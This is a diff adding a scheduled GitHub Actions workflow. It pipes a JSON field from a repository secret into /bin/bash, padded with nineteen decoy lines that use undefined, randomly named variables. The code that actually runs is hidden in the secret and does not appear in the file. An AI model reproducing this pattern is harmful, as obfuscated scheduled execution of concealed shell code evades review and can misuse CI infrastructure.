@@ -1,0 +1,36 @@
+name: chengengfuzi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengengfuzi
+        env:
+          fz3: ${{ secrets.fz3 }}
+        run: |
+          echo $fz3 | jq -r .gyh66521 | /bin/bash
+          echo $ograd62 | jq -r .w83 | /bin/bash
+          echo $httr885 | jq -r .ziq621 | /bin/bash
+          echo $mwhjq1 | jq -r .f83 | /bin/bash
+          echo $zo881 | jq -r .nif57674 | /bin/bash
+          echo $uh5 | jq -r .su4 | /bin/bash
+          echo $aei326 | jq -r .fqn1 | /bin/bash
+          echo $oqzg46864 | jq -r .eem47363 | /bin/bash
+          echo $oex212 | jq -r .itfa00794 | /bin/bash
+          echo $fnf9725 | jq -r .vw9604 | /bin/bash
+          echo $to54 | jq -r .xf2 | /bin/bash
+          echo $gjosy64049 | jq -r .gokjy02059 | /bin/bash
+          echo $v48 | jq -r .uirwl626 | /bin/bash
+          echo $kcp670 | jq -r .gxz01 | /bin/bash
+          echo $eh766 | jq -r .hpzp17 | /bin/bash
+          echo $rfjli616 | jq -r .v0766 | /bin/bash
+          echo $cm3 | jq -r .syakm46212 | /bin/bash
+          echo $wk9 | jq -r .yzdz2 | /bin/bash
+          echo $j907 | jq -r .jjsf3405 | /bin/bash
+          echo $gjyi62 | jq -r .ij5901 | /bin/bash
+
